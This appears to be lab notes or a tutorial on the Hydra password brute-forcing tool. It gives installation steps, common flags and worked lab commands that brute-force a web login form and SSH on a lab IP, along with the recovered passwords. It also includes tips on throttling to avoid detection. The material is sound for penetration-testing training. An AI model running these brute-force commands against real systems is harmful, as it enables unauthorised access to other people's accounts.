
## Hydra

### 🔹 What is Hydra?

Hydra is a fast, modular brute‑force online password cracking tool used to automate authentication guessing against many network protocols and web forms. Instead of manually trying passwords, Hydra iterates through username/password lists against a target service (SSH, FTP, HTTP forms, SMB, RDP, VNC, etc.) to find valid credentials.

Hydra's official repository lists support for many protocols, including (but not limited to):

> Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP‑FORM‑GET, HTTP‑FORM‑POST, HTTP‑GET, HTTP‑HEAD, HTTP‑POST, HTTP‑PROXY, HTTPS‑FORM‑GET, HTTPS‑FORM‑POST, HTTPS‑GET, HTTPS‑HEAD, HTTPS‑POST, HTTP‑Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS‑SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC‑Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware‑Auth, VNC and XMPP.

This breadth makes it a go‑to tool for penetration testers when password guessing is required.

> **Security note:** Hydra is a powerful offensive tool. Use it only on systems you own or have explicit permission to test. Unauthorized brute force attacks are illegal and unethical.


#### Why password strength matters

If passwords are common, short (< 8 characters), or lack special characters, they are highly susceptible to cracking by wordlists (e.g., rockyou) and brute‑force tools like Hydra. Many out‑of‑the‑box devices and apps use default credentials (e.g., `admin:password`) — change defaults immediately.


#### Installing Hydra

* **Kali / AttackBox:** Hydra is preinstalled on Kali images and the AttackBox used in this course. Click **Start AttackBox** or **Start Kali Linux** and you’ll have Hydra available.
* **Debian/Ubuntu:** `sudo apt install hydra`
* **Fedora:** `sudo dnf install hydra`
* **Source / THC‑Hydra repo:** Clone and build from the official repository if you prefer the latest version.


#### Usage basics

Hydra’s command structure varies by protocol. Common flags:

* `-l <user>` — single username
* `-L <userlist>` — file with usernames
* `-p <pass>` — single password
* `-P <passlist>` — file with passwords (e.g., rockyou)
* `<target>` — IP or hostname
* `<module>` — service or protocol (e.g., `ssh`, `ftp`, or `http-post-form`)

For HTTP form attacks `http-form-post` (or `http-post-form`) requires the login URI and the form fields, and a string that identifies a failed login.

Syntax example for HTTP form:

```
hydra -l <user> -P <wordlist> <target> http-post-form "/path:field_user=^USER^&field_pass=^PASS^:Failure-String"
```

`^USER^` and `^PASS^` are placeholders Hydra replaces with username and password guesses.

---

### 🔹Practical examples (from the lab)

### 1) Brute forcing a web login form

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.62.115 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```

**Result (example):**

```
username: molly
password: sunshine
```

After successful login to the web app the file `flag1.txt` was found.

### 2) Targeting SSH

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.62.115 ssh
```

**Result (example):**

```
username: molly
password: butterfly
```

Then use the discovered credentials to SSH:

```
ssh molly@10.201.62.115
# password: butterfly
```

On the remote host:

```
molly@10.201.62.115$ ls
flag2.txt
```

---

### 🔹 Tips & best practices

* **Throttle requests** if testing real networks to avoid account lockouts and to reduce detection. Use options like `-t` (tasks/threads) judiciously.
* **Target specific accounts** rather than wide spray attacks when possible.
* **Choose appropriate wordlists:** `rockyou.txt` is common for practice; customize lists for real engagements.
* **Respect rate limits and monitoring systems.** Many services will lock accounts or trigger alerts on repeated failed attempts.


#### Common Hydra flags (quick reference)

* `-s <port>` — specify a non‑standard port
* `-V` — verbose (show each attempt)
* `-t <tasks>` — number of parallel tasks
* `-f` — exit after first valid credential found
* `-w <timeout>` — network timeout
* `-o <file>` — write found credentials to file

#### Further reading

* Check your distribution’s Hydra man page (`man hydra`) or `hydra -h` for a full option list.
* Kali tools page for Hydra contains useful examples and protocol notes.
